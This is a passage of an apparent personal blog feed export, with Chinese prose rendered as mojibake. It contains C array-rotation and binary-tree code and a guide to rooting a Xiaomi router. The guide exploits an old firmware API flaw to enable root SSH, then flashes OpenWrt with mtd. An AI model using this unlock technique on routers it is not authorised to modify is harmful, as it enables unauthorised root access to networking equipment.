data-srcset="https://img-blog.csdnimg.cn/img_convert/e80ebb7f29f60cf5a4459eecd01af216.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="IMG_0301(20201107-114415)"></p><p><strong>ä¼šå‡ºç°å¦‚ä¸‹çš„æƒ…å†µï¼š</strong></p><p><img src="https://img-blog.csdnimg.cn/img_convert/d75b979d884bb35f34566d48dd7a51e4.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/img_convert/d75b979d884bb35f34566d48dd7a51e4.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20201107115225238"></p><h4 id="æ”¹è¿›-æœ€å¤§å…¬çº¦æ•°GCD">æ”¹è¿›-æœ€å¤§å…¬çº¦æ•°GCD</h4><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">/*** å°†æ–¹æ³•åŠ ä»¥æ”¹è¿› * å°†å…¶æŒ‰ç…§ k æ­¥è¿›è¡Œåˆ†ç»„ï¼Œ   ç±»ä¼¼äºå¸Œå°”æ’åºçš„æ€æƒ³ï¼Œ æ¯é—´éš”kçš„ä½ç½®æ„æˆä¸€ç»„ï¼Œé‚£ä¹ˆæˆ‘ä»¬* çš„æ‰€è°“å³ç§»åªæ˜¯åœ¨è¿™æ¯ä¸€ç»„ä¸­ç»„å†…ç§»åŠ¨ï¼Œç±»ä¼¼ä¸‹å›¾* é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦ç¡®å®šæˆ‘ä»¬è¦å¾ªç¯å‡ æ¬¡å°±å¯ä»¥æ‰¾åˆ°ç­”æ¡ˆå‘¢ï¼Ÿ* ç­”æ¡ˆæ˜¯ç¡®å®šçš„åªéœ€è¦æ‰¾åˆ°ä»–ä»¬çš„ gcd ï¼Œ* ç„¶åè®°å½•ä¸‹å¼€å§‹ä½ç½®ï¼Œé‡‡ç”¨ åæ±‚xçš„æ–¹æ³• å³  ï¼ˆx+k)%n = t, t,n,kå·²çŸ¥ æ±‚æœªçŸ¥æ•°x*  x = (t+n-k)%n; å½“ x == å¼€å§‹ä½ç½®æ—¶åœæ­¢,è¿›å…¥ä¸‹ä¸€ç»„*  æ—¶é—´å¤æ‚åº¦O(n) , ç©ºé—´å¤æ‚åº¦O(1)*/</span><span class="token keyword">int</span> <span class="token function">Gcd</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span><span class="token keyword">int</span> b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token keyword">return</span> b<span class="token operator">==</span><span class="token number">0</span><span class="token operator">?</span>a<span class="token operator">:</span><span class="token function">Gcd</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span>a<span class="token operator">%</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// è¾—è½¬ç›¸é™¤æ³•æ±‚GCD</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">int</span> n<span class="token punctuation">,</span><span class="token keyword">int</span> k<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> gcd <span class="token operator">=</span> <span class="token function">Gcd</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> t<span class="token punctuation">,</span>temp<span class="token punctuation">,</span>j<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">;</span>i <span class="token operator">&lt;</span> gcd<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>temp <span class="token operator">=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// è®°å½•å¼€å§‹ä½ç½® </span>t <span class="token operator">=</span> i<span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>j <span class="token operator">=</span> <span class="token punctuation">(</span> t <span class="token operator">+</span> n <span class="token operator">-</span> k <span class="token punctuation">)</span><span class="token operator">%</span>n<span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span> j <span class="token operator">==</span> i<span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token comment">// å¾ªç¯åˆ°è‡ªå·±è·³å‡º </span>a<span class="token punctuation">[</span>t<span class="token punctuation">]</span> <span class="token operator">=</span> a<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>t <span class="token operator">=</span> j<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>a<span class="token punctuation">[</span>t<span class="token punctuation">]</span> <span class="token operator">=</span> temp<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><ul><li></li></ul><p><img src="https://img-blog.csdnimg.cn/img_convert/ba65b8ae4f7ecfb73fdce18cfa10c903.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/img_convert/ba65b8ae4f7ecfb73fdce18cfa10c903.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20201107154859498"></p><p>==éªŒè¯ï¼š==</p><p><img src="https://img-blog.csdnimg.cn/img_convert/5633b4ad5f4d0d428e0940d69d2d0f1b.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/img_convert/5633b4ad5f4d0d428e0940d69d2d0f1b.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20201107155752226"></p><hr><h3 id="æ–¹æ³•äºŒï¼šå€’å™ç§»ä½">æ–¹æ³•äºŒï¼šå€’å™ç§»ä½</h3><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">/** ``````````````````````åˆ†å‰²çº¿``````````````````````````````* å°†ç©ºé—´å¤æ‚åº¦é™åˆ°O(1)* æ‰€ä»¥è€ƒè™‘åªç”¨ä¸€ä¸ªè¾…åŠ©ç»“ç‚¹çš„ä¼˜åŒ–æ–¹æ³•* * ç¬¬ä¸€ç§ å¾ªç¯kæ¬¡ï¼Œ ä»åé¢å¼€å§‹ç§»åŠ¨ï¼Œ  ç©ºé—´å¤æ‚åº¦ä¸ºO(1) ,ä½†æ—¶é—´å¤æ‚åº¦ä¸º O(kn)**/</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> k<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>       <span class="token keyword">int</span> temp <span class="token operator">=</span> a<span class="token punctuation">[</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>       <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>           a<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> a<span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span>           a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> temp<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span></code></pre><hr><h3 id="æ–¹æ³•ä¸‰ï¼šé€’å½’è°ƒç”¨">æ–¹æ³•ä¸‰ï¼šé€’å½’è°ƒç”¨</h3><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">/** ``````````````````````åˆ†å‰²çº¿``````````````````````````````* å°†ç©ºé—´å¤æ‚åº¦é™åˆ°O(1)* æ‰€ä»¥è€ƒè™‘åªç”¨ä¸€ä¸ªè¾…åŠ©ç»“ç‚¹çš„ä¼˜åŒ–æ–¹æ³•* * ç¬¬äºŒç§ é‡‡ç”¨é€’å½’åè½¬çš„æ–¹å¼  ç©ºé—´å¤æ‚åº¦ä¸ºO(1) ,æ—¶é—´å¤æ‚åº¦ä¸º O(n)* å…ˆé€’å½’åè½¬å‰ ï¼ˆn-k)ä½  åœ¨åè½¬å kä½  æœ€å å…¨éƒ¨åè½¬*/</span>   <span class="token keyword">void</span> <span class="token function">reverse</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">int</span> l<span class="token punctuation">,</span><span class="token keyword">int</span> r<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>       <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token punctuation">;</span> l <span class="token operator">&lt;</span> r<span class="token punctuation">;</span> l<span class="token operator">++</span><span class="token punctuation">,</span>r<span class="token operator">--</span><span class="token punctuation">)</span>       <span class="token punctuation">&#123;</span>           <span class="token keyword">int</span> temp <span class="token operator">=</span> a<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">;</span>           a<span class="token punctuation">[</span>l<span class="token punctuation">]</span> <span class="token operator">=</span> a<span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">;</span>           a<span class="token punctuation">[</span>r<span class="token punctuation">]</span> <span class="token operator">=</span> temp<span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>              <span class="token function">reverse</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>n<span class="token operator">-</span>k<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">reverse</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>n<span class="token operator">-</span>k<span class="token punctuation">,</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">reverse</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span></code></pre><hr></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> ç®—æ³• </category>
          
          <category> C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
            <tag> ç®—æ³• </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å°ç±³é’æ˜¥ç‰ˆè·¯ç”±å™¨è§£é”rootä¸SSHæ–¹æ³•</title>
      <link href="/posts/e5a81842/"/>
      <url>/posts/e5a81842/</url>
      
        <content type="html"><![CDATA[<blockquote><p>@auther by sizaif</p></blockquote><p>@<a href="%E7%9B%AE%E5%BD%95">TOC</a></p><h1>å‰æœŸå‡†å¤‡</h1><blockquote><p>å°ç±³è·¯ç”±å™¨ x1; å®½å¸¦çº¿x1(è¿æ¥è·¯ç”±å™¨å’Œç”µè„‘),</p></blockquote><h1>æ€è·¯</h1><blockquote><p>å› ä¸ºå°ç±³é’æ˜¥ç‰ˆè·¯ç”±å™¨æ²¡æœ‰USBæ’å£,åªèƒ½é€šè¿‡å…ˆåˆ·å¼€å‘ç‰ˆ,å†é€šè¿‡å¼€å‘ç‰ˆæ¥å¼€å¯ROOTå’ŒSSH</p></blockquote><h1>ä¸‹è½½å¼€å‘ç‰ˆæœ¬ROMåŒ…</h1><p><strong>ç‰ˆæœ¬(miwifi_r1cl_all_59371_2.1.26.bin)</strong></p><blockquote><p>æ›´é«˜ç‰ˆæœ¬å·²ç»ä¿®å¤äº†æ­¤æ–¹æ³•,æ‰€ä»¥åªèƒ½æ˜¯æ­¤ç‰ˆæœ¬</p></blockquote><p><a href="http://bigota.miwifi.com/xiaoqiang/rom/r1cl/miwifi_r1cl_all_59371_2.1.26.bin">ä¸‹è½½åœ°å€1:</a><br><a href="https://pan.baidu.com/s/1tAzoAZDvfvQGfSEsDYIe3A">ç™¾åº¦Wç›˜: </a> e2p6</p><h1>ç™»å½•åå°æ‰‹åŠ¨å‡çº§ç³»ç»Ÿ</h1><p>åå°åœ°å€: <strong>192.168.1.1</strong><br>è¿›å…¥åå°å,ç³»ç»Ÿå‡çº§,æ‰‹åŠ¨é€‰æ‹©,é€‰æ‹©å¯¹åº”çš„ROMåŒ…,ç­‰å¾…5-8åˆ†é’Ÿå·¦å³,è·¯ç”±å™¨ä¼šè‡ªåŠ¨å‡çº§,é‡å¯</p><h1>æœ¬åœ°ä»¥å¤ªç½‘è®¾ç½®æ‰‹åŠ¨IPåœ°å€ä¸º192.168.31.2</h1><p><img src="https://img-blog.csdnimg.cn/20200623222155119.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200623222155119.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,color_FFFFFF,t_70" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h1>è¿›å…¥åå°192.168.31.1è¿›è¡Œå¼•å¯¼</h1><blockquote><p>æ­¤è¿‡ç¨‹ä¸­ä¼šè®¾ç½®Wifiåç§°å¯†ç ,ä»¥åŠç®¡ç†å‘˜å¯†ç ,<br>æ³¨æ„!: <strong>ç®¡ç†å‘˜å¯†ç å¾ˆé‡è¦,åé¢ä¼šç”¨åˆ°</strong></p></blockquote><h1>åœ°å€æ å¼€å¯ROOTå’Œssh</h1><p><strong>è¿›å…¥åå°å,æµè§ˆå™¨åœ°å€å†…ä¼šå‡ºç°<br><a href="http://192.168.31.1/cgi-bin/luci/;stok=09a506ee0b8e14d4acf3004a504eba4d/web/home#router">http://192.168.31.1/cgi-bin/luci/;stok=09a506ee0b8e14d4acf3004a504eba4d/web/home#router</a><br>è¿™æ ·çš„ä¿¡æ¯,</strong><br><img src="https://img-blog.csdnimg.cn/20200623222720539.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200623222720539.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><strong>æˆ‘ä»¬å°†URLä¸­ /web/home#router ä¿®æ”¹ä¸º/api/xqsystem/set_name_password?oldPwd=å‰é¢è®¾ç½®çš„ç®¡ç†å‘˜å¯†ç &amp;newPwd=æ–°çš„ç®¡ç†å‘˜å¯†ç </strong></p><blockquote><p>æ³¨æ„:æ–°å¯†ç ä¸æ—§å¯†ç ä¸èƒ½ä¸€è‡´</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200623223033744.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200623223033744.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><strong>å›è½¦å:<br>å¦‚æœæˆåŠŸåˆ™è¿”å›{â€œcodeâ€:0}, å¦‚æœæ˜¯å…¶ä»–å‚æ•°,è¯·æ£€æŸ¥è½¯ä»¶åŒ…æ˜¯å¦ä¸º:59371_2.1.26</strong></p><h1>æµ‹è¯•</h1><p>ç”µè„‘è¿æ¥è·¯ç”±å™¨çš„æƒ…å†µä¸‹,æ§åˆ¶å°:</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token function">ssh</span> root@192.168.31.1</code></pre><p>ç¬¬ä¸€æ¬¡ç™»å½•ä¼šæç¤ºå­˜å‚¨å¯†é’¥,yeså³å¯</p>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> è·¯ç”±å™¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è·¯ç”±å™¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å°ç±³é’æ˜¥ç‰ˆä½¿ç”¨OpenWrtå®ç°æ— çº¿ä¸­ç»§åŠŸèƒ½</title>
      <link href="/posts/57997d7/"/>
      <url>/posts/57997d7/</url>
      
        <content type="html"><![CDATA[<blockquote><p>@auther by sizaif</p></blockquote><p>@<a href="%E7%9B%AE%E5%BD%95">TOC</a></p><h1>ç®€ä»‹</h1><blockquote><p>å› ä¸ºå°ç±³è·¯ç”±å™¨è‡ªå¸¦çš„åå°æ— çº¿åŠŸèƒ½å¤ªé¸¡è‚‹äº†, æ— æ³•å®ç°è‡ªå®šä¹‰è®¾ç½®DCHP,é»˜è®¤ä¸ºDCHPåˆ†é…IP,ä½†æ˜¯åˆ†é…çš„IPåœ°å€å’Œä¸»è·¯ç”±å™¨åœ¨åŒä¸€ä¸ªå­—æ®µ,å½“è®¾å¤‡å¤šæ—¶ä¼šé€ æˆIPå†²çªç°è±¡.æ‰€ä»¥å°†æœºå™¨åˆ·æœºæˆOpenwrtåå®ç°éœ€è¦çš„åŠŸèƒ½</p></blockquote><h1>å°ç±³é’æ˜¥ç‰ˆOpenWrtåˆ·æœº</h1><h2 id="ä¸€è§£é”SSHä¸Root">ä¸€è§£é”SSHä¸Root</h2><div class="story post-story"><p><strong>å‚è€ƒæ–‡ç« é“¾æ¥:<a href="https://blog.csdn.net/sizaif/article/details/106933093">å°ç±³é’æ˜¥ç‰ˆè·¯ç”±å™¨è§£é”rootä¸SSHæ–¹æ³•</a></strong></p></div><h2 id="åˆ·å…¥OpenWrtåŒ…">åˆ·å…¥OpenWrtåŒ…</h2><div class="story post-story"><blockquote><p><strong>ä½¿ç”¨æœ‰çº¿è¿æ¥ç”µè„‘å’Œè·¯ç”±å™¨</strong></p></blockquote><p><a href="http://downloads.openwrt.org/releases/19.07.3/targets/ramips/mt76x8/openwrt-19.07.3-ramips-mt76x8-miwifi-nano-squashfs-sysupgrade.bin">ä¸‹è½½åœ°å€:</a></p><p><strong>1: é‡å‘½ååŒ…åä¸º 1.bin<br>2: å°†ä¸‹è½½çš„æ–‡ä»¶æ‹·è´åˆ°è·¯ç”±å™¨ä¸­ /tmpç›®å½•ä¸‹</strong><br>ä½¿ç”¨CMDæ§åˆ¶å°å‘½ä»¤:<br>(<strong>ä¸ºäº†æ–¹ä¾¿,å¯ä»¥æŠŠæ–‡ä»¶æ”¾åˆ°æˆ‘çš„æ–‡æ¡£é‡Œ, ipåœ°å€åº”è¯¥ä¸º192.168.31.1, å¦‚æœç¬¬ä¸€æ¬¡åˆ·å®Œæœº</strong>)<br>1:</p> <pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token function">scp</span> <span class="token number">1</span>.bin root@192.168.31.1:/tmp/</code></pre><p><img src="https://img-blog.csdnimg.cn/20200708232407257.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200708232407257.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,color_FFFFFF,t_70" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>3: åˆ·æœº</p><blockquote><p>è¿›å…¥è·¯ç”±å™¨å†…éƒ¨/tmp/ç›®å½•ä¸‹:</p></blockquote> <pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token function">ssh</span> root@192.168.31.1</code></pre><p><img src="https://img-blog.csdnimg.cn/20200708232659839.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200708232659839.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,color_FFFFFF,t_70" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><blockquote><p>å¼€å§‹åˆ·æœº</p></blockquote> <pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token builtin class-name">cd</span> /tmp/mtd -r <span class="token function">write</span> <span class="token number">1</span>.bin firmware</code></pre><p><img src="https://img-blog.csdnimg.cn/2020070823284936.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/2020070823284936.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,color_FFFFFF,t_70" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç­‰å¾…ä¸€ä¼šåè·¯ç”±å™¨ä¼šé‡å¯ åˆ·æœºå®Œæˆ</p><h1>æµè§ˆå™¨è¿›å…¥è·¯ç”±å™¨åå°</h1><p><img src="https://img-blog.csdnimg.cn/202007082332522.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/202007082332522.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,color_FFFFFF,t_70" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> è·¯ç”±å™¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è·¯ç”±å™¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>äºŒå‰æ ‘é¢˜ç›®ç®—æ³•é¢˜ç›®æ•´ç†(é™„ä»£ç )</title>
      <link href="/posts/cfa0d73d/"/>
      <url>/posts/cfa0d73d/</url>
      
        <content type="html"><![CDATA[<blockquote><p>@auther by sizaif</p></blockquote><blockquote><p>è¯´æ˜ï¼š<br>ç”±ä¸ªäººæ•´ç†ï¼Œéƒ¨åˆ†é¢˜ç›®æ˜¯ç‹é“çš„é¢˜ç›®,å·²ç»ç»å¸¸ä¼šè€ƒçš„ç‚¹ã€‚<br>å› ä¸ªäººä»£ç é£æ ¼,å·²ç»stackå’Œqueueçš„ä»£ç å®ç°ä¸åŒ,ä»£ç ç•¥æœ‰ä¸åŒä¹‹å¤„ï¼Œ<br>ä½†æ€»ä½“æ€æƒ³æ˜¯æ­£ç¡®çš„<br>æœ‰é”™è¯¯ä¹‹å¤„,æ¬¢è¿æŒ‡å‡º<br>by sizaif</p></blockquote><p>@<a href="%E4%BA%8C%E5%8F%89%E6%A0%91%E9%A2%98%E7%9B%AE%E7%AE%97%E6%B3%95%E6%95%B4%E7%90%86">TOC</a></p><h1>äºŒå‰æ ‘</h1><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><div class="caption"><span>++</span></div><code class="language-c"><span class="token comment">/*** æ ‘ç»“æ„*/</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">Node</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> x<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">Node</span> <span class="token operator">*</span>lson<span class="token punctuation">,</span><span class="token operator">*</span>rson<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>Tree<span class="token punctuation">,</span><span class="token operator">*</span>BiTree<span class="token punctuation">;</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">Queue</span><span class="token punctuation">&#123;</span>    <span class="token comment">//è‡ªå·±æ„é€ é˜Ÿåˆ—</span>    BiTree <span class="token operator">*</span>x<span class="token punctuation">;</span>    <span class="token keyword">int</span> front<span class="token punctuation">;</span>    <span class="token keyword">int</span> rear<span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token function">Initqueue</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        front<span class="token operator">=</span>rear<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>        x <span class="token operator">=</span><span class="token punctuation">(</span>BiTree <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>MAX<span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>Tree<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">void</span> <span class="token function">POP</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        front<span class="token operator">=</span><span class="token punctuation">(</span>front<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span>MAX<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> <span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>rear<span class="token operator">-</span>front <span class="token operator">+</span>MAX<span class="token punctuation">)</span><span class="token operator">%</span>MAX<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    bool <span class="token function">emptys</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>front<span class="token operator">==</span>rear<span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">void</span> <span class="token function">Push_back</span><span class="token punctuation">(</span>BiTree T<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>rear<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span>MAX<span class="token operator">==</span>front<span class="token punctuation">)</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        x<span class="token punctuation">[</span>rear<span class="token punctuation">]</span><span class="token operator">=</span>T<span class="token punctuation">;</span>        rear<span class="token operator">=</span><span class="token punctuation">(</span>rear<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span>MAX<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    BiTree <span class="token function">Getfront</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>front<span class="token operator">==</span>rear<span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>        BiTree T<span class="token punctuation">;</span>        T <span class="token operator">=</span>  x<span class="token punctuation">[</span>front<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> T<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>queues<span class="token punctuation">;</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">Stack</span><span class="token punctuation">&#123;</span>     <span class="token comment">// è‡ªå·±æ„é€ æ ˆ</span>    BiTree <span class="token operator">*</span>tt<span class="token punctuation">;</span>    <span class="token keyword">int</span> top<span class="token punctuation">;</span>    <span class="token keyword">int</span> size<span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token function">InitStack</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        tt<span class="token operator">=</span> <span class="token punctuation">(</span> BiTree <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>n<span class="token 